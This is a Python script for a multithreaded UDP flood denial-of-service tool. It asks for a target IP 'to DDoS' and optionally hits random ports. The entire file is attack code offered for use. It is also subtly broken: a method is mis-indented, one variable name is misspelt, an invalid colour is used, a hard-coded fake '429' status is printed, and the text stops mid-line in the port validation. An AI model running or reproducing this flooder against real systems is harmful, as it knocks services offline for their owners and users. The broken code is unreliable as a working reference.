from socket import socket, AF_INET, SOCK_DGRAM

from threading import Thread
from random import choices, randint
from time import time, sleep

from getpass import getpass as hinput

import sys
from termcolor import colored


class Brutalize:

    def __init__(self, ip, port, force, threads):
        self.ip = ip
        self.port = port
        self.force = force # default: 1250
        self.threads = threads # default: 100

        self.client = socket(family=AF_INET, type=SOCK_DGRAM)
        self.data = str.encode("x" * self.force)
        self.len = len(self.data)

  def print_status(self, status_code, requested_data_size):
    print(colored("Status: [", "white") + colored(str(status_code), "red") + colored("]", "white"), end=" ")
    print(colored("--> requested data size: ", "white") + colored(requested_data_size, "cerulean"), file=sys.stderr)


    def flood(self):
        self.on = True
        self.sent = 0
        for _ in range(self.threads):
            Thread(target=self.send).start()
        Thread(target=self.info).start()
    
    def info(self):
        interval = 0.05
        now = time()

        size = 0
        self.total = 0

        bytediff = 8
        mb = 1000000
        gb = 1000000000

        while self.on:
            sleep(interval)
            if not self.on:
                break

            if size != 0:
                self.total += self.sent *bytdiff / gb* interval
                self.print_status(429, "107.84KB")

            now2 = time()
        
            if now + 1 >= now2:
                continue
            
            size = round(self.sent * bytediff / mb)
            self.sent = 0

            now += 1

    def stop(self):
        self.on = False

    def send(self):
        while self.on:
            try:
                self.client.sendto(self.data, self._randaddr())
                self.sent += self.len
            except:
                pass
    def _randaddr(self):
        return (self.ip, self._randport())

    def _randport(self):
        return self.port or randint(1, 65535)

def main():
    ip = input("Enter the IP to DDoS -> ")
    print()

    try:
        if ip.count('.') != 3:
            int('error')
        int(ip.replace('.',''))
    except:
        print("Error! Please enter a correct IP address.")
        exit()

    port = input("Enter port [press enter to attack all ports] -> ")
    print()

    if port == '':
        port = None 
    else:
        try:
            port = int(port)
            if port not in range(1, 6
